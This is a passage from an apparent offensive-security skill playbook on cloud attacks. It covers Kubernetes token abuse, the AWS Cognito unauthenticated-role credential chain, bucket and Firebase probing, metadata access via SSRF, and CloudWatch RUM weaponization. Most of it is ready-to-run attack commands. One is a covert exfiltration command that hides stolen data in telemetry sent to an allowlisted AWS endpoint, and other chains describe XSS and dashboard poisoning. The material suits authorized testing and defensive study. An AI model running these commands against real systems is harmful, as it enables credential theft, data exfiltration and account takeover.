TOKEN=...
curl -H "Authorization: Bearer $TOKEN" \
  "https://cloudresourcemanager.googleapis.com/v1/projects"
```

---

## Kubernetes — exposed API / SA token

```bash
# Check anonymous access on K8s API
curl -sk "https://k8s.target.com:6443/api/v1/namespaces"

# Anonymous binding (system:anonymous user) — surprisingly common
curl -sk "https://k8s.target.com:6443/api/v1/pods?limit=1"

# If SA token exfil'd (eyJ...):
export TOKEN="eyJ..."
kubectl --token=$TOKEN --server=https://k8s.target.com:6443 --insecure-skip-tls-verify get namespaces
kubectl --token=$TOKEN --server=https://k8s.target.com:6443 --insecure-skip-tls-verify auth can-i --list
kubectl --token=$TOKEN --server=https://k8s.target.com:6443 --insecure-skip-tls-verify get pods -A
kubectl --token=$TOKEN --server=https://k8s.target.com:6443 --insecure-skip-tls-verify get secrets -A
```

### K8s privesc patterns

| You have | Escalate via |
|---|---|
| `pods/exec` on high-priv pod | exec into pod with admin SA token |
| `pods/create` + `serviceaccounts/use` | Create pod mounting admin SA token |
| `secrets/get` | Read any service-account token in cluster |
| `clusterrolebindings/create` | Grant self cluster-admin |
| `roles/escalate` or `clusterroles/escalate` | Add permissions to role |
| `nodes/proxy` | Proxy to kubelet on any node → exec via kubelet |
| `bind` verb on roles | Bind a role you don't have to a subject |
| `impersonate` on users/groups/SAs | Operate as another principal |

---

## Tooling reference

| Tool | Cloud | Purpose |
|---|---|---|
| **Pacu** | AWS | Full red-team framework, 100+ modules |
| **enumerate-iam.py** | AWS | Brute-force list of API calls to discover permissions |
| **PMapper** | AWS | Visualize privesc paths as graph |
| **CloudFox** | AWS | Recon-focused (enumerate resources, no privesc) |
| **Prowler** | AWS/Azure/GCP | Compliance scanning + enumeration |
| **ScoutSuite** | AWS/Azure/GCP/OCI | Multi-cloud audit |
| **AzureHound** | Azure | BloodHound-style graph for Azure |
| **MicroBurst** | Azure | Azure-specific recon and abuse modules |
| **ROADtools** | Azure | Entra ID enumeration toolkit |
| **GCPBucketBrute** | GCP | GCS bucket permission enumeration |
| **gcpwn** | GCP | GCP-specific exploitation framework |
| **Peirates** | K8s | Container/cluster exploitation toolkit |
| **kube-hunter** | K8s | Auto-scan cluster from inside/outside |
| **kubectl-trace** | K8s | Trace processes (post-foothold) |

---

## Anti-patterns

- **DO NOT run write/delete operations without explicit OK** — IAM mutation is destructive and audit-visible
- **DO NOT enumerate everything in scope of an account** — `aws iam list-users` against an account with 50,000 users is loud and slow
- **DO NOT use `aws *` with non-test creds without confirming you have the right account** — accidentally hitting prod = career risk
- **DO NOT confuse "I have the credential" with "this credential is current"** — always check expiration / rotation via STS first
- **DO NOT assume an STS token from one account works across accounts** — region restrictions and trust policies apply
- **DO NOT skip CloudTrail/Activity Log awareness** — every API call is logged; pair with `mid-engagement-ir-detection`
- **DO NOT pivot deeper than the SOW allows** — discovering admin creds doesn't mean using them; some engagements are read-only

---

## Bridge to neighboring skills

- `hunt-cloud-misconfig` — finds the credentials in the first place (public buckets, IMDS via SSRF, leaked JSON)
- `hunt-ssrf` — SSRF→IMDS is the canonical chain into cloud control plane
- `apk-redteam-pipeline` — APK secret extraction commonly yields cloud creds
- `supply-chain-attack-recon` — CI/CD pipelines store cloud creds; finding them is a separate workflow
- `m365-entra-attack` — Azure cross-product; Managed Identity tokens cross over to Graph
- `mid-engagement-ir-detection` — cloud control plane activity is monitored; expect mitigations

---

## Severity scoring guidance

| Finding | Severity |
|---|---|
| AWS access key with `*:*` in policy → confirmed admin | Critical |
| GCP SA JSON with `roles/owner` on production project | Critical |
| Azure MI on internet-exposed VM with Owner role | Critical |
| Leaked cred with read-only on prod data store | High (or Critical depending on data sensitivity) |
| Leaked cred with privesc path but no admin yet | High |
| Leaked cred — read access only to non-sensitive | Medium |
| Anonymous public bucket — listing only | Low/Medium |
| Anonymous bucket — write permission | High |

---

## Cleanup discipline (deliverable hygiene)

If during the engagement you:
- Used `sts:AssumeRole` to chain — note the role names and times in IoCs
- Created any IAM resources (test users, roles, policies) — list them with explicit cleanup confirmation
- Read sensitive data (Secrets Manager, KMS keys, Storage blob content) — note in deliverable that data was viewed but not exfiltrated outside the engagement systems

Cloud activity is trivially auditable; the client WILL find it post-engagement. Documenting now > getting blindsided later.

---

## AWS Cognito Identity Pool — Unauthenticated-Role Attack Chain (2024-2026 surface)

AWS Cognito has two distinct services often confused: **User Pools** (auth provider) and **Identity Pools** (federated identity → IAM credentials). Identity Pools can be configured with *"Enable access to unauthenticated identities"* — which gives ANY anonymous caller an IAM role via `cognito-identity:GetId` → `cognito-identity:GetCredentialsForIdentity`. Mobile apps and SPAs ship the IdentityPoolId in the page bundle. Developers commonly attach overly-broad IAM permissions to the unauth role, especially when the pool was set up for AWS Amplify / Pinpoint / CloudWatch RUM and the role policy was never narrowed.

### Step 1 — Discover the IdentityPoolId

The IdentityPoolId is a **public identifier** by AWS design (`<region>:<UUID>` format). The find:

```bash
# JS bundle / SPA regex (against *.js, *.html, source-map files)
grep -ErohE "identityPoolId[\"'`\s:=]+[\"']([a-z]{2}-[a-z]+-[0-9]:[0-9a-f-]{36})[\"']" .
grep -ErohE "IdentityPoolId[\"'`\s:=]+[\"']([a-z]{2}-[a-z]+-[0-9]:[0-9a-f-]{36})[\"']" .
grep -ErohE "\"PoolId\"\s*:\s*\"([a-z]{2}-[a-z]+-[0-9]:[0-9a-f-]{36})\"" .

# Mobile APK (after jadx decompile)
grep -rEi "identity[_-]?pool[_-]?id" decoded/
grep -rE "\"[a-z]{2}-[a-z]+-[0-9]:[0-9a-f-]{36}\"" decoded/

# Also check
amplifyconfiguration.json
awsconfiguration.json
aws-exports.js
.env.js
*.js.map
```

Wayback CDX captures, GitHub code-search for the apex domain + `IdentityPoolId`, and JS chunks linked from `index.html` are the high-yield search corpora.

### Step 2 — `GetId` (unauth)

```bash
aws cognito-identity get-id \
  --identity-pool-id us-east-1:abcd1234-5678-90ab-cdef-1234567890ab \
  --region us-east-1 \
  --no-sign-request
```

`--no-sign-request` is critical — tells the CLI not to look for ambient AWS credentials. Returns `{"IdentityId": "us-east-1:<uuid>"}`. If this returns `NotAuthorizedException`, unauth identities are disabled — stop, not exploitable.

### Step 3 — `GetCredentialsForIdentity`

```bash
aws cognito-identity get-credentials-for-identity \
  --identity-id us-east-1:<returned-uuid> \
  --region us-east-1 \
  --no-sign-request
```

Returns real STS credentials with ~1 hour TTL: `AccessKeyId` (ASIA…), `SecretKey`, `SessionToken`, `Expiration`.

### Step 4 — Confirm role ARN

```bash
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity
```

Returns role ARN like `arn:aws:sts::<account>:assumed-role/Cognito_<PoolName>Unauth_Role/CognitoIdentityCredentials`. Account ID is now disclosed.

### Step 5 — Enumerate role permissions

Direct (rare):
```bash
aws iam get-role --role-name Cognito_<PoolName>Unauth_Role
aws iam list-role-policies --role-name Cognito_<PoolName>Unauth_Role
aws iam list-attached-role-policies --role-name Cognito_<PoolName>Unauth_Role
```

Blackbox (the normal case) — fire a permission probe across high-value services and observe `AccessDenied` vs success. Pacu's `iam__enum_permissions --role-name <name>` brute-forces ~500 IAM actions; `enumerate-iam.py` by Andrés Riancho covers ~1000. Common over-permissions: `s3:Get*`/`s3:List*`, `dynamodb:Scan`, `lambda:InvokeFunction`, `appsync:GraphQL`, `cognito-idp:AdminCreateUser`, `iam:PassRole`, `kms:Decrypt`.

### Severity rubric

| Finding | Severity | Justification |
|---|---|---|
| Unauth role with `*:*` or `AdministratorAccess` | **Critical** (9.8+) | Full AWS account takeover |
| Unauth role with `s3:Get*` / `s3:List*` on production customer buckets, or `dynamodb:Scan` on user tables | **Critical** (9.1-9.8) | Mass PII / data breach |
| Unauth role with `appsync:GraphQL` on production API, or `lambda:InvokeFunction` on internal lambdas | **Critical** (9.0) | Authenticated backend access |
| Unauth role with `cognito-idp:Admin*` on the linked User Pool | **Critical** (9.1) | Mass ATO primitive |
| Unauth role with `iam:PassRole` + create-function | **Critical** (9.8) | Documented priv-esc to admin |
| Unauth role with `s3:PutObject` on web-hosting bucket | **High** (8.1) | Stored XSS / supply-chain |
| Unauth role with `kms:Decrypt` on a customer CMK | **High** (7.5-8.5) | Depends on ciphertext reachability |
| Unauth role with read-only on a single hardcoded non-sensitive resource | **Medium** (5.3) | Limited business impact |
| Unauth identities enabled but role policy denies everything | **Informational** | Best-practice deviation only |

### Disclosed cases / authoritative writeups

1. **Andres Riancho — "Misconfigured Cognito Identity Pools" (2020, refreshed 2023)** — original research establishing the attack class. `GetCredentialsForIdentity` against unauth pools with default `*` policies. [andresriancho.com](https://andresriancho.com/identity-pools-and-the-default-iam-role-trap/)
2. **Rhino Security Labs — Pacu `cognito__enum_identity_pools` module** — production tooling that automates Steps 1-5 of the chain. [github.com/RhinoSecurityLabs/pacu](https://github.com/RhinoSecurityLabs/pacu/tree/master/pacu/modules/cognito__enum_identity_pools)
3. **NotSoSecure / Claranet — "Exploiting weak configurations in Amazon Cognito" (Nov 2023)** — walkthrough of identityPoolId extraction → assume guest role → S3/DynamoDB/Lambda enumeration. Calls out RUM, Amplify, Pinpoint as the three SDKs that commonly expose the pool ID in HTML. [notsosecure.com](https://www.notsosecure.com/exploiting-weak-configurations-in-amazon-cognito/)
4. **HackTricks Cloud — `aws-cognito-unauthenticated-enum`** — canonical playbook covering Steps 1-5. [cloud.hacktricks.wiki](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html)
5. **Spaceraccoon / Eugene Lim — "Mass Account Takeover via Cognito IdentityPool" (Medium, 2020)** — SaaS provider exposed IdentityPoolId in Amplify config; unauth role had `cognito-idp:AdminConfirmSignUp` + `AdminUpdateUserAttributes` on the linked User Pool — silent confirmation of any signup + email change = mass ATO.
6. **Datadog Security Labs — "Following AWS Logs Backwards: Cognito Identity Pool Abuse" (2024)** — telemetry across Datadog customer base showing real-world Cognito pool abuse. Non-trivial percentage of pools paired with policies broader than the minimum required. [securitylabs.datadoghq.com](https://securitylabs.datadoghq.com/articles/abusing-aws-cognito-misconfigurations/)

### Reporting tip

Always include in the report:
- `sts get-caller-identity` output (proves the role ARN + account ID)
- Pacu `iam__enum_permissions` JSON output (proves the granted actions)
- A concrete data-pull PoC (one sample S3 object listing, one DynamoDB record with PII redacted)

Without all three, triagers downgrade to Medium. The 60-second test is `GetId → GetCredentialsForIdentity → sts get-caller-identity`. If you reach step 3 anonymously, you have a finding.

Cross-reference: `hunt-cloud-misconfig` → `CloudWatch RUM weaponization` covers the specific RUM-embedded variant of this attack class.

---

## Related Skills & Chains

- **`hunt-ssrf`** — Most external paths to a cloud credential begin with SSRF reaching the metadata service. Chain primitive: SSRF + IMDSv1 → instance role token → `cloud-iam-deep` privilege-escalation patterns reach prod S3 / Secrets Manager.
- **`hunt-cloud-misconfig`** — Public buckets and exposed configs are the most common credential-leak vector. Chain primitive: Cloud misconfig (`.env` in public S3) + leaked AWS access key → IAM enumeration → `iam:PassRole` chain to admin.
- **`supply-chain-attack-recon`** — CI/CD often holds long-lived deploy credentials. Chain primitive: Exposed GitHub Actions OIDC misconfig + assume-role permission → `cloud-iam-deep` cross-account role assumption.
- **`m365-entra-attack`** — Azure Managed Identity overlaps Entra service principals. Chain primitive: SSRF on Azure App Service → Managed Identity token → `m365-entra-attack` Graph API enumeration → cross-tenant escalation.
- **`security-arsenal`** — Load the Cloud IAM Privilege-Escalation Payload Pack (24+ AWS, 8+ Azure, 6+ GCP escalation patterns with `aws cli` one-liners).
- **`triage-validation`** — Apply the Server-State-vs-Policy gate: a permissive IAM policy alone is not a finding; demonstrate actual privileged action (e.g., read prod secret, create cross-account role) before reporting.



---

## cloud-misconfig

## 16. CLOUD / INFRA MISCONFIGS

### S3 / GCS / Azure Blob
```bash
# S3 listing
curl -s "https://TARGET-NAME.s3.amazonaws.com/?max-keys=10"
aws s3 ls s3://target-bucket-name --no-sign-request

# Try common bucket names
for name in target target-backup target-assets target-prod target-staging; do
  curl -s -o /dev/null -w "$name: %{http_code}\n" "https://$name.s3.amazonaws.com/"
done

# Firebase open rules
curl -s "https://TARGET-APP.firebaseio.com/.json"   # read
curl -s -X PUT "https://TARGET-APP.firebaseio.com/test.json" -d '"pwned"'  # write
```

### EC2 Metadata (via SSRF)
```bash
http://169.254.169.254/latest/meta-data/iam/security-credentials/  # role name
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME  # keys
```

### Exposed Admin Panels
```
/jenkins  /grafana  /kibana  /elasticsearch  /swagger-ui.html
/phpMyAdmin  /.env  /config.json  /api-docs  /server-status
```

---

### Jenkins SSO-restriction failure → Script Console RCE
An exposed Jenkins that authenticates ANY personal Google/OAuth account (missing org-domain restriction) is full compromise: log in, then `/script` (Groovy console) = RCE, and `/credentials` + `/scriptText` = stored API tokens and source disclosure. Disclosed: reports/231460.

### Exposed message broker (RabbitMQ / AMQP) with default creds
Probe RabbitMQ management (`http://TARGET:15672/`, API `:15672/api/overview`) and AMQP `:5672`; try default `guest:guest` (works off-localhost when `loopback_users` is misconfigured) → queue/message read, vhost enumeration, management-plugin admin. Disclosed: reports/753602.

## Local-verification toolchain

For testing cloud-misconfig findings against a local AWS sim before/instead of hitting real cloud:

```bash
# LocalStack 3.0 community (pin the version — 4.x requires a Pro license)
docker run -d --name lab-localstack -p 14566:4566 localstack/localstack:3.0

# awscli ≥ 2.30 + LocalStack 3.0 incompatibility workaround (x-amz-trailer header):
export AWS_REQUEST_CHECKSUM_CALCULATION=when_required
export AWS_RESPONSE_CHECKSUM_VALIDATION=when_required
export AWS_ENDPOINT_URL=http://localhost:14566
export AWS_ACCESS_KEY_ID=test AWS_SECRET_ACCESS_KEY=test AWS_DEFAULT_REGION=us-east-1
```

Without those env vars, `aws s3 cp/sync` fails with `InvalidRequest`. Document this for the team. See `docs/verification/phase2j-cloud-localstack.md` for the full reproducible flow.

---

## CloudWatch RUM Weaponization (2024-2026 surface)

AWS CloudWatch RUM (Real-User Monitoring) is a client-side telemetry service launched late 2021. Customers embed a JS snippet on their pages that sends performance/error events to `dataplane.rum.<region>.amazonaws.com`. The snippet's `AppMonitor` config contains an `identityPoolId` (Cognito) and `guestRoleArn` (IAM role) — both **public by design**. The IAM role policy is the security boundary, and when developers leave it broader than the documented minimum (`rum:PutRumEvents` on the AppMonitor ARN), the entire pool becomes the unauthenticated AWS-credential vending machine described in `cloud-iam-deep` → Cognito Identity Pool chain.

### Detection — JS bundle fingerprints

**Snippet-style (most common, embedded in `<head>`):**
```javascript
(function(n,i,v,r,s,c,x,z){...})(
  'cwr',
  '00000000-0000-0000-0000-000000000000',                       // applicationId (UUID)
  '1.0.0',
  'us-east-1',
  'https://client.rum.us-east-1.amazonaws.com/1.x/cwr.js',
  {
    sessionSampleRate: 1,
    guestRoleArn: "arn:aws:iam::123456789012:role/RUM-Monitor-...-Unauth",
    identityPoolId: "us-east-1:abcd1234-...",
    endpoint: "https://dataplane.rum.us-east-1.amazonaws.com",
    telemetries: ["errors","performance","http"]
  }
);
```

**NPM-style (aws-rum-web package):**
```javascript
import { AwsRum, AwsRumConfig } from 'aws-rum-web';
const config: AwsRumConfig = { identityPoolId, endpoint, guestRoleArn, ... };
const awsRum = new AwsRum(APPLICATION_ID, '1.0.0', AWS_REGION, config);
```

### Regex set for recon

```bash
# Detect RUM init
grep -REn "cwr\(['\"]init['\"]|from\s+['\"]aws-rum-web['\"]|new\s+AwsRum\(" .

# Extract applicationId (UUID v4)
grep -ErohE "applicationId['\"]?\s*[:=]\s*['\"]([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})['\"]" .

# Extract identityPoolId (region:UUID)
grep -ErohE "identityPoolId['\"]?\s*[:=]\s*['\"]([a-z]{2}-[a-z]+-[0-9]+:[0-9a-f-]{36})['\"]" .

# Extract guestRoleArn (leaks AWS account ID + role name)
grep -ErohE "guestRoleArn['\"]?\s*[:=]\s*['\"]arn:aws:iam::[0-9]{12}:role/[A-Za-z0-9._/-]+['\"]" .

# Endpoint reveals region
grep -ErohE "dataplane\.rum\.[a-z0-9-]+\.amazonaws\.com" .
```

### Attack chains

**Chain A — Credential extraction (Critical when guestRole is over-permissioned).** Once `identityPoolId` is extracted from the page, anyone runs:

```bash
aws cognito-identity get-id \
  --identity-pool-id "us-east-1:abcd1234-..." \
  --region us-east-1 --no-sign-request
aws cognito-identity get-credentials-for-identity \
  --identity-id "us-east-1:<returned-uuid>" \
  --region us-east-1 --no-sign-request
# → STS creds; export and:
aws sts get-caller-identity        # confirm role
aws s3 ls; aws dynamodb list-tables; aws lambda list-functions; aws ssm describe-parameters; aws secretsmanager list-secrets
# Automate: pacu / enumerate-iam.py
```

Full chain documented in `cloud-iam-deep` → Cognito Identity Pool unauthenticated chain. RUM is one common embedding context.

**Chain B — Telemetry endpoint covert exfil.** `dataplane.rum.<region>.amazonaws.com` is an **AWS-owned domain on every enterprise allowlist**. The `PutRumEvents` payload accepts arbitrary `userDetails` and `customEvents` string fields:

```bash
aws rum put-rum-events \
  --id $(uuidgen) \
  --app-monitor-details '{"id":"<appId>","version":"1.0.0"}' \
  --user-details '{"userId":"EXFIL_PAYLOAD_HERE","sessionId":"<session>"}' \
  --rum-events '[{"id":"'$(uuidgen)'","timestamp":'$(date +%s)',"type":"com.amazon.rum.custom_event","details":"{\"exfil\":\"<base64 of stolen data>\"}"}]' \
  --endpoint-url "https://dataplane.rum.us-east-1.amazonaws.com" \
  --region us-east-1
```

Defenders watching egress see traffic to a known-good AWS hostname; DLP doesn't parse the JSON body; SIEM rules typically don't ingest customer RUM telemetry.

**Chain C — DOM injection via snippet source poisoning.** Many customers either self-host `cwr.js` on their own CDN (`assets.target.com/cwr.js`) or bundle `aws-rum-web` and serve from `static.target.com/main.<hash>.js`. Subdomain takeover on the JS host or supply-chain compromise (npm typosquat against `aws-rum-webb`) gives persistent JS execution on every page-load with the trust of the `aws-rum-web` SDK — including its already-granted Cognito permissions.

**Chain D — Telemetry injection / dashboard poisoning.** With the public `identityPoolId` + `applicationId`, an external attacker can flood `PutRumEvents` with fake error spikes (drown real alerts), inject XSS payloads into page-URL telemetry that fire when an SOC analyst views the CloudWatch dashboard, and inflate billable RUM event counts (financial DoS).

### Severity rubric

| Finding | Severity | Justification |
|---|---|---|
| `guestRoleArn` with `*:*` or wildcards on multiple services | **Critical** (9.1+) | Anonymous full AWS access |
| `guestRoleArn` with `s3:*`, `dynamodb:*`, `secretsmanager:*`, `lambda:Invoke*` on production resources | **High** (7.5-8.8) | Data exfil / RCE depending on resource |
| `guestRoleArn` with `cognito-identity:*` or `iam:PassRole` | **High** (8.0) | Privilege escalation primitive |
| `guestRoleArn` with only `rum:PutRumEvents` + endpoint-scoped resource | **Informational** | Documented, intended config |
| RUM `userDetails` logging PII into events viewable in CloudWatch console | **Medium** (5.3-6.5) | Sensitive data exposure via dashboard sharing |
| RUM AppMonitor accepts `PutRumEvents` from arbitrary internet sources (telemetry injection) | **Low-Medium** (4.3) | Dashboard poisoning, alert evasion, billing DoS |
| Self-hosted `cwr.js` on takeoverable subdomain | **Critical** (9.8) when chained | Persistent stored XSS across every customer page |

### Disclosed cases / authoritative writeups

No CVE assigned specifically to AWS RUM as of 2026-05. The attack class is documented in research but specific named bug-bounty payouts on RUM are rare in public hacktivity. The pattern is "Cognito identity pool over-permission via embedded SDK" — RUM is one common embedding.

- **Andres Riancho — "Misconfigured Cognito Identity Pools" (2020/2023)** — establishes the attack class. [andresriancho.com](https://andresriancho.com/identity-pools-and-the-default-iam-role-trap/)
- **Rhino Security Labs — Pacu `cognito__enum_identity_pools`** — production tooling that automates Chain A. [github.com/RhinoSecurityLabs/pacu](https://github.com/RhinoSecurityLabs/pacu)
- **NotSoSecure / Claranet — "Exploiting weak configurations in Amazon Cognito" (Nov 2023)** — explicitly calls out RUM as one of three SDKs commonly leaking the pool ID. [notsosecure.com](https://www.notsosecure.com/exploiting-weak-configurations-in-amazon-cognito/)
- **HackTricks Cloud — `aws-cognito-unauthenticated-enum`** — canonical playbook. [cloud.hacktricks.wiki](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html)
- **Datadog Security Labs — "Following AWS Logs Backwards: Cognito Identity Pool Abuse" (2024)** — telemetry showing real-world abuse rates. [securitylabs.datadoghq.com](https://securitylabs.datadoghq.com/articles/abusing-aws-cognito-misconfigurations/)
- **aws-observability/aws-rum-web GitHub issues #213, #404** — community discussion of the bundled-snippet security model. [github.com/aws-observability/aws-rum-web](https://github.com/aws-observability/aws-rum-web/issues)

### Validation checklist (before reporting)

1. Extract `identityPoolId` from page source.
2. Confirm pool allows unauth identities (`get-id` succeeds without auth).
3. Confirm `get-credentials-for-identity` returns STS creds.
4. Run `aws sts get-caller-identity` and **screenshot the role ARN**.
5. Run `enumerate-iam` / Pacu `iam__enum_permissions` — capture **at least one allowed action beyond `rum:PutRumEvents`**. Without this, the finding is Informational.
6. Demonstrate at least one read/list against a real resource (S3 bucket list, DynamoDB scan, Lambda invoke).
7. **Do not** modify/delete data even if permitted — read-only PoC only.

---

## Related Skills & Chains

- **`hunt-subdomain`** — Stale CNAMEs pointing to deleted buckets are a takeover gold mine. Chain primitive: Cloud misconfig (S3 public/deleted) + `hunt-subdomain` → unclaimed CNAME points to bucket → `assets.target.com` takeover.
- **`cloud-iam-deep`** — A leaked SA JSON / AWS key in a public bucket is only half the bug. Chain primitive: Public S3 + leaked AWS key in `.env` → `cloud-iam-deep` enumeration → cross-service `iam:PassRole` escalation.
- **`hunt-ssrf`** — Metadata service is reachable only from inside the VPC; SSRF is the bridge. Chain primitive: SSRF + cloud misconfig (IMDSv1 still enabled) → instance role keys → S3/RDS data read.
- **`supply-chain-attack-recon`** — Exposed CI/CD endpoints and SBOMs reveal internal package names. Chain primitive: Exposed Jenkins/GitLab + internal package name leak → npm/PyPI dependency-confusion publish → CI build pwn.
- **`security-arsenal`** — Load the Cloud Bucket Wordlist (target-prod / target-backup / target-staging permutations) and the Admin-Panel Path List for fast enumeration.
- **`triage-validation`** — Apply the Unique-Marker gate: any "writable bucket" claim requires a write of a unique marker file and a read-back from a clean session before report submission.



